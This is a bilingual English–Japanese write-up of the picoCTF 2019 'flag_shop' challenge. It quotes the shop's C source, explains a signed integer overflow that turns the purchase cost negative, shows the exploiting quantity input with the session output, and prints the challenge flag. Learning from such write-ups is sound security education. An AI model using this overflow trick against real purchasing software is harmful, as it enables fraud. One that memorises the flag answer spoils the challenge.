# flag_shop - Points: 300 
## Category
General Skills
## Problem Statement
> There's a flag shop selling stuff, can you buy a flag? [Source](https://github.com/s4lm0n-m4k1/CTF_Writeup_pico2019/blob/master/General%20Skills/flag_shop/store.c). Connect with `nc 2019shell1.picoctf.com 14937`.
## Solution 
```
$ nc 2019shell1.picoctf.com 14937
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```
After I tried to connect to the given port, a interactive program welcomes me. \
ポートに繋がった後、インタラクティブなプログラムが実行されたので。遊んでみました。
```
 Enter a menu selection:
1
 Balance: 1100 
```
```
 Enter a menu selection:
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
1

The final cost is: 900

Your current balance after transaction: 200
```
```
Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one 1

Not enough funds for transaction
```
No matter what how I tried, it is impossible for me to buy 1337 Flag which costs 100000 dollars. \
どうやって試しても、10万ドルもする1337フラッグを買うのは無理です。 <br> 
<br>
So I tried to check the source file to find vulnerability of the program. \
与えられたソースファイルを使って、逆転を探してみました。
```c
printf("These knockoff Flags cost 900 each, enter desired quantity\n");
int number_flags = 0;
fflush(stdin);
scanf("%d", &number_flags);
if(number_flags > 0)
{
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour current balance after transaction: %d\n\n", account_balance);
    }
    else{
        printf("Not enough funds to complete purchase\n");
    }
}
```
I notice that from this line `account_balance = account_balance - total_cost;`, you can increase the number of **account_balance** if **total_cost** will reach negative number. In order for the **total_cost** to reach a negative number, the value should goes beyond C interger max value, +2147483647. \
</br>
コードの中の`account_balance = account_balance - total_cost;`でもし`total_cost < 0`だった場合**account_balance**を増やせると築きました。やり方は**total_cost**オーバーフローさせる戦法で行こうと考えました。やり方はintの最大数字、+2147483647超えればオーバーフローです。
```
$ nc 2019shell1.picoctf.com 14937
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1 
These knockoff Flags cost 900 each, enter desired quantity
999999999

The final cost is: -1943133060

Your current balance after transaction: 1943134160
```
The code below was the key to make the final cost or total_cost to become `-1943133060` \
下にあるコードが**final cost** もしくは、**total_cost** が`-1943133060`になった結果です。
```c
total_cost = 900*number_flags;
/*
  999999999*900(input*const900) > 2147483647(int max)
*/
```
With this method, the current balance becomes `1943134160` which is plenty enough to buy the 1337 flag \
これで、バランスが今`1943134160`になっているので、1337フラグは余裕に買えます。
```
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_e062f0fd}
```
> Reference: [tutorialpoint](https://www.tutorialspoint.com/c_standard_library/limits_h.htm) </br>
## Flag
`picoCTF{m0n3y_bag5_e062f0fd}`
